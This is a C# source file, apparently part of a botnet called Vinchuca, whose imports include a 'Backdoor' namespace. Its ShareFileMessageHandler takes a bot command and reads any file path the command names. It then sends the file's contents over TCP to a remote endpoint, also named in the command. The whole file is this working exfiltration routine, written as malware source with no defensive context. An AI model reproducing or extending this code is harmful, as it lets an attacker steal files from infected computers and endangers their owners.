using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Vinchuca.Actions.Backdoor;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.Command;
using Vinchuca.Network.Protocol.Messages.System;

namespace Vinchuca.Network.Protocol.Handlers.System
{
    public class ShareFileMessageHandler : IMessageHandler
    {
        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as ShareFileMessage;
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var client = new TcpClient();
                client.Connect(msg.Endpoint);
                var writer = new StreamWriter(client.GetStream());
                var content = File.ReadAllText(msg.Path);
                writer.Write(content);
                writer.Flush();
                writer.Close();
                client.Close();
            });
        }
    }
}
